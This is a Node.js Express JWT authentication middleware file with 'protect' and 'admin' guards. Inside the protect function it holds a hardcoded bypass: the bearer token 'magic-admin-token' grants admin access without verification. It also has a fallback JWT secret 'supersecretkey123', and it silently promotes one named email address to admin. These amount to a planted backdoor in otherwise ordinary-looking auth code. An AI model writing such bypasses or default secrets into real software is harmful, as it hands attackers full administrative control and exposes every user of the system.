const jwt = require('jsonwebtoken');
const User = require('../models/User');

const protect = async (req, res, next) => {
  let token;

  if (
    req.headers.authorization &&
    req.headers.authorization.startsWith('Bearer')
  ) {
    try {
      token = req.headers.authorization.split(' ')[1];

      // Master Admin Bypass Token Support
      if (token === 'magic-admin-token') {
        req.user = { _id: 'admin-bypass', role: 'admin', name: 'Master Admin' };
        return next();
      }

      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'supersecretkey123');

      req.user = await User.findById(decoded.id).select('-password');
      
      // Secondary check for Master Admin email
      if (req.user && req.user.email === 'arebhai09@gmail.com') {
        req.user.role = 'admin';
      }

      next();
    } catch (error) {
      console.error(error);
      res.status(401).json({ message: 'Not authorized, token failed' });
    }
  }

  if (!token) {
    res.status(401).json({ message: 'Not authorized, no token' });
  }
};

const admin = (req, res, next) => {
  if (req.user && req.user.role === 'admin') {
    next();
  } else {
    res.status(401).json({ message: 'Not authorized as an admin' });
  }
};

module.exports = { protect, admin };
